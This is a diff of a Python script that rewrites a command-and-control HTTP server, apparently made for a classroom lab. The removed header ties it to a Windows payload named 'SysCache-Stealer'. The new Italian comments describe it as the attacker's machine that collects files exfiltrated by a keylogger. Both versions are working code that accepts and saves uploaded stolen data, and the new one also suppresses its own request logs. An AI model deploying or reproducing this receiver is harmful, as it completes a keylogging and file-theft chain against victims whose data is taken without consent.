@@ -1,51 +1,36 @@
 #!/usr/bin/env python3
 # ============================================================
-# KALI C2 SERVER - HTTP FILE RECEIVER
-# For use with SysCache-Stealer (Windows Payload)
-# Educational use only - ITS Angelo Rizzoli
+#  SERVER ATTACCANTE (macchina Kali "attaccante")
+#  Raccoglie i file esfiltrati dal keylogger via HTTP POST.
+#  Uso:  python3 server_attaccante.py
 # ============================================================
+import http.server, socketserver, os, datetime
 
-from http.server import SimpleHTTPRequestHandler, HTTPServer
-import os
-import datetime
+PORT     = 4444
+SAVE_DIR = "ricevuti"
 
-HOST = '0.0.0.0'
-PORT = 4444
-UPLOAD_DIR = "received_data"
+os.makedirs(SAVE_DIR, exist_ok=True)
 
-
-class UploadHandler(SimpleHTTPRequestHandler):
+class Handler(http.server.BaseHTTPRequestHandler):
     def do_POST(self):
-        if not os.path.exists(UPLOAD_DIR):
-            os.makedirs(UPLOAD_DIR)
+        length = int(self.headers.get("Content-Length", 0))
+        data   = self.rfile.read(length)
+        fname  = os.path.basename(self.headers.get(
+                     "X-Filename", f"dump_{datetime.datetime.now():%Y%m%d_%H%M%S}.bin"))
+        # anti path traversal: basename + solo dentro SAVE_DIR
+        path = os.path.join(SAVE_DIR, fname)
+        with open(path, "wb") as f:
+            f.write(data)
+        print(f"[+] Ricevuto: {fname} ({len(data)} byte) da {self.client_address[0]}")
+        self.send_response(200); self.end_headers(); self.wfile.write(b"OK")
 
-        filename = self.headers.get('X-Filename', 'unknown_file')
-        content_length = int(self.headers.get('Content-Length', 0))
+    def log_message(self, *a):  # silenzia i log HTTP di default
+        pass
 
-        if content_length > 0:
-            file_data = self.rfile.read(content_length)
-            filepath = os.path.join(UPLOAD_DIR, filename)
-            with open(filepath, 'wb') as f:
-                f.write(file_data)
+class Server(socketserver.ThreadingTCPServer):
+    allow_reuse_address = True
 
-            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            print(f"[{timestamp}] [+] Received file: {filename} ({content_length} bytes)")
-        else:
-            print(f"[-] Received empty request from {self.client_address[0]}")
-
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"File uploaded successfully.")
-
-
-if __name__ == '__main__':
-    server_address = (HOST, PORT)
-    httpd = HTTPServer(server_address, UploadHandler)
-    print(f"[*] C2 Server started on {HOST}:{PORT}")
-    print(f"[*] Saving received files to: ./{UPLOAD_DIR}/")
-    print("[*] Waiting for incoming connections...")
-
-    try:
-        httpd.serve_forever()
-    except KeyboardInterrupt:
-        print("\n[*] Server shutting down.")
+if __name__ == "__main__":
+    with Server(("0.0.0.0", PORT), Handler) as srv:
+        print(f"[*] In ascolto su 0.0.0.0:{PORT} - file salvati in ./{SAVE_DIR}/")
+        srv.serve_forever()
